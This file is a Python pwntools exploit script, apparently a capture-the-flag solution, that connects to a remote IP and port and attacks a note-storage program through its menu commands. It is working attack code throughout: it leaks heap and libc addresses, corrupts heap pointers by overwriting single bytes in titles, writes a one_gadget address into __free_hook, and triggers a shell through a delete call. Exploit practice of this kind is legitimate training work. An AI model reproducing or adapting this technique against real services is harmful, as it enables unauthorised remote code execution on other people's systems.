from pwn import *
#r = process('./bin')
r = remote('139.162.160.184', 19999)
def store(x, y):
    r.sendlineafter('[Q]', 'S')
    r.sendlineafter('title', x)
    r.sendlineafter('content', y)
def ret(x):
    r.sendlineafter('[Q]', 'R')
    r.sendlineafter('title', x)
def c_content(x, y):
    r.sendlineafter('[Q]', 'U')
    r.sendlineafter('title', x)
    r.sendlineafter('content', y)
def c_title(x, y):
    r.sendlineafter('[Q]', 'M')
    r.sendlineafter('title', x)
    r.sendlineafter('new', y)
def delete(x):
    r.sendlineafter('[Q]', 'D')
    r.sendlineafter('title', x)
def show():
    r.sendlineafter('[Q]', 'P')

def pwn():
    store('A'*8, 'B'*0x10)
    show()
    r.recvuntil('AAAAAAAA')
    heap = u64(r.recvline().rstrip().ljust(8, b'\x00'))
    log.success('Heap @ '+hex(heap))
    delete('A'*8)
   
    store('A'*8, p64((heap-610)>>8))
    c_title('A'*8, 'a'*8+chr((heap-610)&0xff))
    c_content('a'*8, chr(0xff)*8)
    store('A','B'*9)
    store('C',p64((heap+0x100)>>8))
    delete('A')
    c_title('C', 'z'*8+chr(0xb0))
    show()
    r.recvline()
    r.recvline()
    libc = u64(r.recvline().rstrip().ljust(8, b'\x00'))-4111520
    log.success('Libc @ '+hex(libc))
    
    
    where = libc+0x3ed8e8 # free_hook
    store('pwn',p64((where)>>8))
    c_title('pwn', 'z'*8+chr(where&0xff))
    c_content('z'*8, p64(libc+0x4f432)) # one_gadget
    
    store('gimme shell', 'A')
    
    # shell
    delete('gimme shell')
    
    r.interactive()

pwn()
